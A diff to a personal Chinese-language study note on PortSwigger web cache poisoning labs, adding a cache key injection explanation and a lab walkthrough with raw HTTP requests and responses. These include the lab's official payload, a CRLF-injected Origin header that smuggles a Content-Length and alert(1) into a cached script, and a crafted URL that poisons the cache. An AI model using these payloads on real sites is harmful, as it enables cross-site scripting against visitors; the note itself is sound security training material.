@@ -1,8 +1,10 @@
 ---
 title: Web cache poisoning
 description: Web cache poisoning
+# last_update:
+#   date: "2025-09-23T08:00:00+08:00"
 last_update:
-  date: "2025-09-23T08:00:00+08:00"
+  date: "2025-11-09T08:00:00+08:00"
 ---
 
 ## Lab: Web cache poisoning with an unkeyed header
@@ -938,14 +940,152 @@ Cookie: session=1sRfKPxBJzGkrHxXNeO6RtU4Jl656T1f
 
 我原本有找到 404 頁面似乎有 reflected xss 的跡象，只是當時我是在 querystring 下手，忘記 path 也存在 reflected xss 的可能性，虧我之前還找過 [URL Path Reflected XSS](https://zeroday.hitcon.org/vulnerability/ZD-2025-01087)
 
+## Cache key injection
+
+假設 cache server 用 \_\_ 來分割 cache component
+
+Attack Request
+
+```
+GET /path?param=123 HTTP/1.1
+Origin: '-alert(1)-'__
+
+
+```
+
+Response
+
+```
+HTTP/1.1 200 OK
+X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
+
+<script>…'-alert(1)-'…</script>
+```
+
+再搭配一個社交工程，誘導受害者訪問，就會中招
+
+```
+GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
+```
+
 ## Lab: Cache key injection
+
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
 
 | Dimension | Description                                                                                                                          |
 | --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
 | Document  | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#cache-key-injection                         |
 | Lab       | https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection |
 
-<!-- todo-yus 最後再來解，好像需要 http/2 的知識 -->
+嘗試 `Pragma: x-get-cache-key`
+
+```
+GET / HTTP/2
+Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
+Cookie: session=S0CyGKRxU7iufAhqUZrutMJigwG2miwh
+Pragma: x-get-cache-key
+
+
+```
+
+回傳
+
+```
+HTTP/2 302 Found
+Location: /login?lang=en
+Vary: origin
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 32
+X-Cache-Key: /$$
+X-Cache: hit
+Content-Length: 0
+
+
+```
+
+嘗試注入 origin
+
+```
+GET /path/to/source?foo=bar HTTP/2
+Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
+Cookie: session=S0CyGKRxU7iufAhqUZrutMJigwG2miwh
+Pragma: x-get-cache-key
+Origin: hello-world
+
+
+```
+
+回傳
+
+```
+HTTP/2 404 Not Found
+Content-Type: application/json; charset=utf-8
+Vary: origin
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 18
+X-Cache-Key: /path/to/source?foo=bar$$origin=hello-world
+X-Cache: hit
+Content-Length: 11
+
+"Not Found"
+```
+
+這題感覺很難，我後來直接看官方提供的 Solution，覺得這個 payload 根本是妖魔鬼怪，是我即便認真思考也想不出來的
+
+Attack Request
+
+```
+GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
+Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
+Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+
+
+```
+
+回傳
+
+```
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+Access-Control-Allow-Origin: x
+Cache-Control: max-age=35
+Age: 23
+X-Cache: hit
+Content-Length: 8
+
+alert(1)
+```
+
+Attack Request
+
+```
+GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
+Host: 0a2000b50348eac2801503af00a2003e.web-security-academy.net
+
+
+```
+
+回傳
+
+```
+HTTP/2 302 Found
+Location: /login/?lang=en
+Vary: origin
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=35
+Age: 30
+X-Cache: hit
+Content-Length: 0
+
+
+```
+
+這題我覺得太難...以後有機會再來理解吧
+
+<!-- todo-yus 未來有興趣再搞懂 -->
 
 ## Lab: Internal cache poisoning
 
